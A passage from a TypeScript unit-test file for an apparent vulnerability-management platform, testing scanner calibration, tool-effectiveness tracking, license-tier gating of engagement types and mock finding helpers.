      expect(cal.length).toBe(1);
      expect(cal[0].truePositiveRate).toBe(1.0);
    });

    it('should update rates with multiple outcomes', () => {
      for (let i = 0; i < 3; i++) {
        pipeline.recordOutcome({ vulnClass: 'SQLi', scannerUsed: 'nuclei', detectionMethod: 'behavior_test', wasAccepted: true });
      }
      pipeline.recordOutcome({ vulnClass: 'SQLi', scannerUsed: 'nuclei', detectionMethod: 'behavior_test', wasAccepted: false });

      const cal = pipeline.getScannerCalibration('nuclei');
      expect(cal[0].truePositiveRate).toBe(0.75);
      expect(cal[0].falsePositiveRate).toBe(0.25);
    });

    it('should not adjust confidence with insufficient data', () => {
      pipeline.recordOutcome({ vulnClass: 'SQLi', scannerUsed: 'nuclei', detectionMethod: 'test', wasAccepted: true });
      expect(pipeline.getConfidenceAdjustment('SQLi', 'nuclei', 'test')).toBe(0);
    });

    it('should adjust confidence with sufficient data', () => {
      for (let i = 0; i < 6; i++) {
        pipeline.recordOutcome({ vulnClass: 'SQLi', scannerUsed: 'nuclei', detectionMethod: 'test', wasAccepted: true });
      }
      const adj = pipeline.getConfidenceAdjustment('SQLi', 'nuclei', 'test');
      expect(adj).toBeGreaterThan(0);
    });
  });

  describe('ToolEffectivenessTracker', () => {
    let tracker: ToolEffectivenessTracker;

    beforeEach(() => {
      tracker = new ToolEffectivenessTracker();
    });

    it('should record tool performance', () => {
      tracker.recordPerformance({
        toolName: 'nuclei', vulnClass: 'SQLi',
        detected: true, wasTruePositive: true,
        wasUniqueToTool: true, wasCorroborated: false,
      });

      const summary = tracker.getEffectivenessSummary();
      expect(summary.nuclei).toBeTruthy();
      expect(summary.nuclei.overallDetectionRate).toBe(1.0);
    });

    it('should track unique and corroborated findings', () => {
      tracker.recordPerformance({
        toolName: 'zap', vulnClass: 'XSS',
        detected: true, wasTruePositive: true,
        wasUniqueToTool: true, wasCorroborated: false,
      });
      tracker.recordPerformance({
        toolName: 'zap', vulnClass: 'XSS',
        detected: true, wasTruePositive: true,
        wasUniqueToTool: false, wasCorroborated: true,
      });

      const summary = tracker.getEffectivenessSummary();
      expect(summary.zap.overallDetectionRate).toBe(1.0);
    });

    it('should find best tool for vuln class', () => {
      for (let i = 0; i < 5; i++) {
        tracker.recordPerformance({ toolName: 'nuclei', vulnClass: 'SQLi', detected: true, wasTruePositive: true, wasUniqueToTool: false, wasCorroborated: false });
        tracker.recordPerformance({ toolName: 'zap', vulnClass: 'SQLi', detected: i < 2, wasTruePositive: i < 2, wasUniqueToTool: false, wasCorroborated: false });
      }

      const best = tracker.getBestToolForVulnClass('SQLi');
      expect(best).toBeTruthy();
      expect(best!.toolName).toBe('nuclei');
    });
  });

  describe('getReproductionGuidelines', () => {
    it('should return guidelines for SQL Injection', () => {
      const guidelines = getReproductionGuidelines('SQL Injection');
      expect(guidelines.vulnClass).toBe('SQL Injection');
      expect(guidelines.requiredEvidence.length).toBeGreaterThan(0);
      expect(guidelines.commonMistakes.length).toBeGreaterThan(0);
    });

    it('should return default for unknown vuln class', () => {
      const guidelines = getReproductionGuidelines('Unknown Vuln');
      expect(guidelines.vulnClass).toBe('default');
    });
  });

  describe('processCrossTrainingBatch', () => {
    it('should process outcomes and update all systems', () => {
      const repo = new PatternRepository();
      const cal = new CalibrationPipeline();
      const tracker = new ToolEffectivenessTracker();

      const outcomes: OutcomeLogEntry[] = [{
        id: '1', timestamp: Date.now(),
        vulnClass: 'SQL Injection', severity: 'high', detectionMethod: 'behavior_test', scannerUsed: 'nuclei',
        outcome: 'accepted',
        reproductionQuality: 0.9, evidenceQuality: 0.85, impactAccuracy: 0.8,
        discoveryToSubmissionMs: 3600000,
        extractedPatterns: [createMockPattern({ isContextIndependent: true, id: 'p1' })],
      }];

      const result = processCrossTrainingBatch(outcomes, repo, cal, tracker);
      expect(result.calibrationUpdates).toBe(1);
      expect(result.toolEffectivenessUpdates).toBe(1);
      expect(result.patternsExtracted).toBe(1);
      expect(result.contaminationRejections).toBe(0);
    });
  });
});

// ─── License-Tier Gating Tests ─────────────────────────────────────────────────

import {
  checkEngagementTypeAllowed,
  checkConcurrentEngagementLimit,
  checkFeatureAvailable,
  getAvailableEngagementTypes,
  getTierComparison,
  TIER_CONFIGS,
  ENGAGEMENT_TYPE_INFO,
} from './lib/license-tier-gating';

describe('License-Tier Gating', () => {
  describe('checkEngagementTypeAllowed', () => {
    it('should allow VA for standard tier', () => {
      const result = checkEngagementTypeAllowed('vulnerability_assessment', 'standard');
      expect(result.allowed).toBe(true);
    });

    it('should allow bug bounty for standard tier', () => {
      const result = checkEngagementTypeAllowed('bug_bounty', 'standard');
      expect(result.allowed).toBe(true);
    });

    it('should NOT allow pentest for standard tier', () => {
      const result = checkEngagementTypeAllowed('pentest', 'standard');
      expect(result.allowed).toBe(false);
      expect(result.requiredTier).toBe('professional');
      expect(result.upgradeMessage).toBeTruthy();
    });

    it('should NOT allow red team for standard tier', () => {
      const result = checkEngagementTypeAllowed('red_team', 'standard');
      expect(result.allowed).toBe(false);
      expect(result.requiredTier).toBe('enterprise');
    });

    it('should allow pentest for professional tier', () => {
      const result = checkEngagementTypeAllowed('pentest', 'professional');
      expect(result.allowed).toBe(true);
    });

    it('should allow purple team for professional tier', () => {
      const result = checkEngagementTypeAllowed('purple_team', 'professional');
      expect(result.allowed).toBe(true);
    });

    it('should NOT allow red team for professional tier', () => {
      const result = checkEngagementTypeAllowed('red_team', 'professional');
      expect(result.allowed).toBe(false);
    });

    it('should allow everything for enterprise tier', () => {
      const types = ['vulnerability_assessment', 'bug_bounty', 'phishing', 'tabletop', 'pentest', 'purple_team', 'red_team'] as const;
      for (const type of types) {
        const result = checkEngagementTypeAllowed(type, 'enterprise');
        expect(result.allowed).toBe(true);
      }
    });
  });

  describe('checkConcurrentEngagementLimit', () => {
    it('should allow within limit', () => {
      const result = checkConcurrentEngagementLimit('standard', 3);
      expect(result.allowed).toBe(true);
    });

    it('should block at limit', () => {
      const result = checkConcurrentEngagementLimit('standard', 5);
      expect(result.allowed).toBe(false);
    });

    it('should allow unlimited for enterprise', () => {
      const result = checkConcurrentEngagementLimit('enterprise', 1000);
      expect(result.allowed).toBe(true);
    });
  });

  describe('checkFeatureAvailable', () => {
    it('should allow compliance for standard', () => {
      const result = checkFeatureAvailable('compliance', 'standard');
      expect(result.allowed).toBe(true);
    });

    it('should NOT allow pentest for standard', () => {
      const result = checkFeatureAvailable('pentest', 'standard');
      expect(result.allowed).toBe(false);
    });

    it('should allow c2_integration for enterprise', () => {
      const result = checkFeatureAvailable('c2_integration', 'enterprise');
      expect(result.allowed).toBe(true);
    });
  });

  describe('getAvailableEngagementTypes', () => {
    it('should return all types with lock status for standard', () => {
      const types = getAvailableEngagementTypes('standard');
      expect(types.length).toBe(7);
      
      const va = types.find(t => t.type === 'vulnerability_assessment');
      expect(va!.locked).toBe(false);
      
      const pentest = types.find(t => t.type === 'pentest');
      expect(pentest!.locked).toBe(true);
      
      const redTeam = types.find(t => t.type === 'red_team');
      expect(redTeam!.locked).toBe(true);
    });

    it('should unlock pentest for professional', () => {
      const types = getAvailableEngagementTypes('professional');
      const pentest = types.find(t => t.type === 'pentest');
      expect(pentest!.locked).toBe(false);
    });
  });

  describe('getTierComparison', () => {
    it('should return 3 tiers', () => {
      const comparison = getTierComparison();
      expect(comparison.length).toBe(3);
      expect(comparison[0].tier).toBe('standard');
      expect(comparison[1].tier).toBe('professional');
      expect(comparison[2].tier).toBe('enterprise');
    });

    it('should show increasing engagement types per tier', () => {
      const comparison = getTierComparison();
      expect(comparison[0].engagementTypes.length).toBeLessThan(comparison[1].engagementTypes.length);
      expect(comparison[1].engagementTypes.length).toBeLessThan(comparison[2].engagementTypes.length);
    });
  });

  describe('TIER_CONFIGS', () => {
    it('should have correct standard tier limits', () => {
      expect(TIER_CONFIGS.standard.maxConcurrentEngagements).toBe(5);
      expect(TIER_CONFIGS.standard.retentionDays).toBe(90);
    });

    it('should have unlimited enterprise limits', () => {
      expect(TIER_CONFIGS.enterprise.maxConcurrentEngagements).toBe(-1);
      expect(TIER_CONFIGS.enterprise.retentionDays).toBe(-1);
    });
  });

  describe('ENGAGEMENT_TYPE_INFO', () => {
    it('should have info for all engagement types', () => {
      expect(ENGAGEMENT_TYPE_INFO.vulnerability_assessment).toBeTruthy();
      expect(ENGAGEMENT_TYPE_INFO.bug_bounty).toBeTruthy();
      expect(ENGAGEMENT_TYPE_INFO.pentest).toBeTruthy();
      expect(ENGAGEMENT_TYPE_INFO.red_team).toBeTruthy();
      expect(ENGAGEMENT_TYPE_INFO.purple_team).toBeTruthy();
      expect(ENGAGEMENT_TYPE_INFO.phishing).toBeTruthy();
      expect(ENGAGEMENT_TYPE_INFO.tabletop).toBeTruthy();
    });

    it('should have correct required tiers', () => {
      expect(ENGAGEMENT_TYPE_INFO.vulnerability_assessment.requiredTier).toBe('standard');
      expect(ENGAGEMENT_TYPE_INFO.bug_bounty.requiredTier).toBe('standard');
      expect(ENGAGEMENT_TYPE_INFO.pentest.requiredTier).toBe('professional');
      expect(ENGAGEMENT_TYPE_INFO.red_team.requiredTier).toBe('enterprise');
    });
  });
});

// ─── Helper Functions ──────────────────────────────────────────────────────────

function createMockFinding(overrides: Partial<NormalizedFinding> = {}): NormalizedFinding {
  return {
    findingId: crypto.randomUUID?.() || Math.random().toString(36),
    fingerprint: Math.random().toString(36).slice(2, 18),
    sources: [{ scanner: 'nuclei', scanTimestamp: Date.now() }],
    firstSeen: Date.now(),
    lastSeen: Date.now(),
    cveIds: [],
    cweIds: [],
    vulnClass: 'Test Vulnerability',
    title: 'Test Finding',
    description: 'Test description',
    affectedAsset: { hostname: 'test.com' },
    severity: 'medium',
    detectionMethod: 'heuristic',
    detectionConfidence: 0.5,
    verificationStatus: 'unverified',
    verificationHistory: [],
    exploitability: {
      isKev: false,
      hasMetasploitModule: false,
      hasNucleiTemplate: false,
      hasPublicExploit: false,
      attackComplexity: 'unknown',
      privilegesRequired: 'unknown',
      userInteraction: 'unknown',
    },
    evidence: [],
    corroborationCount: 1,
    corroborationTier: 'potential',
    ...overrides,
  };
}

function createMockBugBountyFinding(overrides: Partial<BugBountyFinding> = {}): BugBountyFinding {
  return {
    id: '1',
    engagementId: 1,
    title: 'Test Finding',
    vulnType: 'SQL Injection',
    severity: 'high',
    target: 'https://app.example.com',
    endpoint: '/api/search',
    parameter: 'q',
    reproductionSteps: [
      { stepNumber: 1, action: 'Navigate to search', expectedResult: 'Search page loads' },
      { stepNumber: 2, action: 'Enter payload', expectedResult: 'Normal response', actualResult: 'SQL error' },
    ],
    prerequisites: ['Authenticated user account'],
    evidence: [
      { type: 'http_request', title: 'Request', content: 'GET /api/search?q=test', timestamp: Date.now() },
    ],
    impactAnalysis: {
      technicalImpact: 'Database access',
      businessImpact: 'Data breach risk',
      affectedUsers: 'all',
      dataAtRisk: ['user credentials', 'PII'],
    },
    status: 'draft',
    discoveredAt: Date.now(),
    ...overrides,
  };
}

function createMockPattern(overrides: Partial<ExtractedPattern> = {}): ExtractedPattern {
  return {
    id: 'pattern-1',
    category: 'detection',
    vulnClass: 'SQL Injection',
    title: 'Error-based detection pattern',
    description: 'Look for database error messages in response body after injecting single quotes',
    applicability: 'Web applications with SQL backends',
    confidence: 0.8,
    observationCount: 5,
    successRate: 0.75,
    isContextIndependent: true,
    sanitizationApplied: ['target_removal'],
    firstObserved: Date.now() - 86400000,
    lastObserved: Date.now(),
    lastValidated: Date.now(),
    ...overrides,
  };
}
